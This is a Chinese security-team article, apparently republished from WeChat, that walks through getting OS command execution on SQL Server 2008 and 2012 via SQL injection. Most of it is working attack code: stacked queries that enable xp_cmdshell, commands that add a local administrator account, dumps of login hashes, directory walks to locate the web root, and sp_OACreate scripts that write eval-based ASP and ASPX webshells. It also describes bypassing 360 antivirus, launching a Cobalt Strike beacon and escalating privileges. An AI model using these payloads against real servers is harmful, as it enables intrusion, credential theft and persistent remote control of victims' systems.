<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PWHk-CIFaitwZ2rCOftIbg)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

1 sql server 执行 os-shell
========================

条件：数据库权限必须是 dba 权限 可利用 sql-shll 进行命令执行，部分常用 ql 语句：

```
查看版本：SELECT @@version<br style="visibility: visible;">查看连接用户：<br style="visibility: visible;"> SELECT ORIGINAL_LOGIN(),APP_NAME(), CONNECTIONPROPERTY('CLIENT_NET_ADDRESS') , CONNECTIONPROPERTY('PROTOCOL_TYPE')<br style="visibility: visible;"> 查询所有数据库名称<br style="visibility: visible;">select name from master.dbo.sysdatabases;<br style="visibility: visible;">查看用户hash：<br style="visibility: visible;">select name,sys.fn_varbintohexstr(password_hash) from sys.sql_logins<br style="visibility: visible;">查看数据库账号密码：<br style="visibility: visible;">select name,sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;<br style="visibility: visible;"><br style="visibility: visible;"><br style="visibility: visible;">查看数据库中表名：<br style="visibility: visible;"><br style="visibility: visible;">SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = 'U' and sysstat<200<br style="visibility: visible;"><br style="visibility: visible;">exec xp_dirtree 'c:'        # 列出所有c:\文件、目录、子目录exec xp_dirtree 'c:',1      # 只列c:\目录<br style="visibility: visible;">exec xp_dirtree 'c:',1,1    # 列c:\目录、文件<br style="visibility: visible;">exec xp_subdirs 'C:';       # 只列c:\目录
select is_srvrolemember('sysadmin') # 判断是否是SA权限
select is_member('db_owner')        # 判断是否是db_owner权限
select is_srvrolemember('public')   # 判断是否是public权限
创建用户：
exec master..xp_cmdshell "net user test12 123.com add"

exec master..xp_cmdshell "net localgroup administrators test12 add"

exec master..xp_cmdshell "net user test12"
读取文档内容
create table files(line varchar(1024))

bulk insert  files from 'C:\inetpub\aa.asp'

select * from files
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAl8GaF7xpcWHFibEk0RNXP5tKQpDjWKMoXaFdHYNIBT4RtJkG1TXf034Q/640?wx_fmt=png)

  
默认新建的用户只有 public 权限， sqlserver 数据库进行 os-shell 执行，主要是利用开启 xp_cmdshell 进行命令执行，通过命令执行查看，返回结果为 1，说明是存在 xp_cmdshell，该命令只能证明是否存在 xp_cmdshell，并不能证明可执行 xp_cmdshell

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlS6luv8dtGTg4rVCgLK9nzIMkJaQ9p686hHyQ2Bm64GlbYhgtMhVqfQ/640?wx_fmt=png)

1.1 针对 sqlserver2008 测试
-----------------------

### 1.1 当前用户不是 dba

在当前用户不为 dba 情况，利用 sqlmap 执行 os-shell，提示如下：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlibLfWic5RgUJs8fk8dhClz2VuRAN0BXBO1XSVv2OicWtvOOH5yZ6FX5jQ/640?wx_fmt=png)

  
非 dba 权限的用户即使在开启 xpcmdshell 的情况下也无法进行命令执行，提示没有权限：  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlvSIaG5v7eReljpBmsVJDkQTNgXPvyicMLC8lsyeIOFRtFzXBBZvv9ag/640?wx_fmt=png)

  
dba 权限在未开启 cmdshell 情况下执行命令提示如下：当非 dba 权限尝试开启 cmdshell 时提示没有该操作权限：  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlTypuG60qE06JB1c5kQfoicDOg2ywia2QgIFJthL9fR4tibdLPicbnKLmuw/640?wx_fmt=png)

  
所以这就是为什么在我们发现 sql 注入的时候，如果当前用户不是 dba 权限的情况下无法进行命令执行。

### 1.2 当前用户为 dba

在进行注入时，如果当前用户为 dba，可尝试利用如下命令手动开启 xpcmd_shell

```
EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE;
```

接下来分析下 sqlmap 如何去检测和开启 xp_cmdshell, 通过抓取数据包发现，开启 cmdshell 命令如下：

```
;EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
```

当尝试利用 os-shell 无法开启时，可尝试利用 sql-shell 开启，xpcmd_shell，本次在测试时发现，直接在 sql-shell 中执行上述 4 条开启的语句无法开启成功，可尝试拼接 sql 语句进行开启

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
```

查询语句为查看 xpcmd_shell 组件的命令，执行语句后返回结果 1，即为查询成功：  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlw0v87JB2fwbOqrycoRPLf3V6OVrD2ktneAYicMkC7TCFTibY6xQUUWFg/640?wx_fmt=png)

  
判断是否存在站库分离：

```
select host_name();             //主机名
select @@servername;            //服务器名
//如果相同则代表数据库和web在同一台机器上面
```

执行后发现返回的服务器名称相同，可见未进行站库分离，如下图：  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlWoicuhOeh84RrBTZ917nOTZcVWRu6t23o7HZNX4fHHz0cNWdkm7xwjQ/640?wx_fmt=png)

  
即使主机上安装有 360 等安全设备，执行该命令后，也可以将 xp cmd_shell 组件开启，通过测试发现，主机上杀毒软件拦截只有在调用 xpcmd_shell 进行命令执行时才会进行拦截  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlv1qLCUvxNZ7zPpsdTsD0C7qdIG0icrbQD3XzoLYF1kGiacPNiarLQwUHQ/640?wx_fmt=png)

### 1.3 xpcmd_shell 为什么无法执行命令

在没有防护的情况下，可利用 sqlmap 正常开启 xpcmd_shell 进行命令执行，但是很多情况下会发现 无法进行命令执行，sqlmap 提示如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlMs5HicNLMTyGh6Qohkwq21CFY5CCSUl8A3T6CrLIqQ87Z2iaXzBprkiaA/640?wx_fmt=png)

  
此时可能原因是对服务器上安装有安全软件，本次测试在测试环境中安全了 360 安全软件，可在调用 xpcmd_shell 组件时，被安全软件拦截  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAloYSTePuHMSeLbbp6swia3CuFMty8j34yWsPfqZciboPluZ9VibeuWSkLA/640?wx_fmt=png)

  
思路一：如果在已知 sqlserver 账户密码的情况下，利用 navicat 连接数据库进行手动写入 shell：开启 sp_OACreate 组件

```
EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE WITH OVERRIDE; 
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 
EXEC sp_configure 'show advanced options', 0;
```

利用文件存储先写入文件：

```
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:\inetpub\aa.asp', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>' 
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlNXOKIzicZ3MqYdqzRhy0xP6QZSIxMUz9SU3z2cBoa08hRjeB2hSzmJA/640?wx_fmt=png)  
可成功在 c 盘 inetpub 路径下写入 aa.asp 文件，shell 的写入路径可利用 execute master..xp_dirtree 命令进行查找

```
execute master..xp_dirtree 'c:/inetpub/test/',1,1
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAld90ibueeicKJQBT5s49ibfpnl8Vlghfpo3m8DOU8sMSorQhEqTkdJWiccA/640?wx_fmt=png)

  
利用上述方法的前提是在已经知道 sqlsever 数据库的的管理账号密码，可利用 --passwords 参数查看。思路二：假如未能成功登录，可先通过查看网站路径，在写入 shell 方式，步骤如下: 1、新建 tmp 表格，并将 master..xp_dirtree 的存储结果保存到表格中，命令如下：

```
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

可在 sql-shell 中执行，执行效果如下：![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlS4cItEedaEotX2iawFB3thSE9V6uYMqw8Xw8XPk66EYK4sSpicka8kCQ/640?wx_fmt=png)也可通过注入点直接执行，执行效果如下：![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlvznZS8iaXKPnnEzEESNaEjmMCQNn7Atax3do0qJ9aeJgK6kPY6drSFg/640?wx_fmt=png)直接在 sql-shell 中执行命令查看结果：select * from test.tmp![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlowmIOEsiaF3iboSNqsbpc4xoRmuyCuydWiaLQbAFOJRFEoeFY9Wc9rHqg/640?wx_fmt=png)  
可发现存在 inetpub 目录，接着在查看改目录下文件，为了防止目录过多，可尝试删除之前 tmp 在重新表格，存储新目录下的数据，删除表格直接执行`drop table tmp`, 可在利用 select 查询重新确定下是否删除成功。新建表格命令如下：

```
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:/inetpub/',1,1;
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlaVqpHom1tegL7EQEhHh4caB0PIHYOHV4hibW0mdTPLOK6FJkkVHyfiaw/640?wx_fmt=png)在用 select 命令进行查看，![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAltZKibsfhMba0xldpmBS74wpswcTSZkovnvyFnNcsFbicvkFicPAmrFeIA/640?wx_fmt=png)  
利用该方法慢慢找到网站的路径，可能就是比较慢，通过测试发现该种方法是不会被主机上的杀软拦截的。找到根目录后用 Scripting.FileSystemObject 中 CreateTextFile 和 WriteLine 来实现写入 webshell，sql-shell 执行命令如下, 前提时先开启 sp_OACreate，开启脚本如下：

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;
```

写入 shell 脚本：

```
declare @f int,@g int;exec sp_oacreate 'Scripting.FileSystemObject',@f output;EXEC SP_OAMETHOD @f,'CreateTextFile',@f OUTPUT,'c:\inetpub\test\test.aspx',1;EXEC sp_oamethod  @f,'WriteLine',null,'<%@ Page Language="Jscript"%><%var a = "un";var b = "safe";Response.Write(eval(Request.Item["z"],a%2Bb));%>'
```

可成功写入一句话木马，如下图：![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAl3icWVyaMfQiaFx2XMM82ibmQuNVdnC8sdNLpYvnbuZlWskHsznaYiaLrvw/640?wx_fmt=png)利用蚁剑可成功连接 shell![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAljxcnUTyS0yuIgho2YZFJVPG8S7VeBDmEJuXEfKDLabk3Uv7jJ85cPg/640?wx_fmt=png) 只是此时权限较低，是 iis 权限需要进行进一步提权。在进行提权时系统安装 360 可能不能成功，此时可尝试低权限上线 cs，然后利用 cs 提权，需要进行 360 绕过，也可采用 sqlserver 的 sqlps.exe 文件进行命令执行，不管时利用哪种方式，此时考察的就是免杀能力了。

1.2 sqlserver 2012 测试
---------------------

之前验证了 sqlserver 2008 如何通过 sql 注入获取系统 shell，主要是通过调用 xpcmd_shell，但是当服务器上存在杀毒软件时无法进行开启，此时可尝试 sql-shell，寻找网站目录，然后写入一句话木马的方式，只是写入的 shell 权限比较低，接下来尝试利用 sqlserver2012 进行测试。

1.2.1 无杀软执行 xpcmd_shell
-----------------------

sqlserver2012 默认 cpcmd_shell 也是关闭的, 当服务器主机不存在杀软时，可直接执行 os-shell，进行命令执行。![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlTjuXMj7ntob0KcibcgZv9KoCcRNkpQP80kFM5AMiawWqrF2bXDAVXbibA/640?wx_fmt=png)此时可通过执行 pwershell 直接上线 cs，但是此时上线的权限为 sqlserver，可通过 ms16-075 进行提权到 system，然后在进行后渗透即可，在不存在杀软的情况下相对比较顺利，接下来看下如何绕过杀软上传 shell。![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlrSlAibuEfDHKK5OEcrSniaDYQicoezHOFPLDXfCTVbx4okSaBO70cUwibw/640?wx_fmt=png)

1.2.2 绕过杀软上传 shell
------------------

主机上安装 360，直接通过 sqlmap 执行 os-shell 会被拦截，尝试 sql-shell 进行命令执行，步骤和 2008 大致基本相同，先通过 xp_dirtree 慢慢找到网站路径，在开启 sp_OACreate，最后写入 shell。

```
declare @o int, @f int, @t int, @ret int;exec sp_oacreate 'scripting.filesystemobject', @o out;exec sp_oamethod @o,'createtextfile', @f out, 'e:\test\123.asp', 1;exec @ret = sp_oamethod @f, 'writeline', NULL,'<%@ Page Language="Jscript"%><%var a = "un";var b = "safe";Response.Write(eval(Request.Item["z"],a%2Bb));%>' 
```

可尝试利用判断是否写入成功

```
create table sssss (line varchar(1024))；bulk insert  sssss from 'e:\test\123.asp'；select * from sssss
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAlVBWkA9PpyAUUqxcByqy1iapW8fCBKXZB95QBLgzBbhVibLtX2icibB8eNA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUxLupx3iaICPPLkmic03UOAl3UkakegvcEJ4WztuKfyz3Lu4VQnlmH0FtrGQIF8bPZbqNXTRoNlFzw/640?wx_fmt=png)  

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室，近三年来在网络安全技术方面开展研发项目 60 余项，获得各类自主知识产权 30 余项，省市级科技项目立项 20 余项，研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。对安全感兴趣的小伙伴可以加入或关注我们。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUGxmZ0l89buUNbyVALKxic2nM7hnDCkAKIrjKhdcDfVkGq3PxNzgs7m55BBMwmicc0AvFpYcrd6J6Q/640?wx_fmt=jpeg)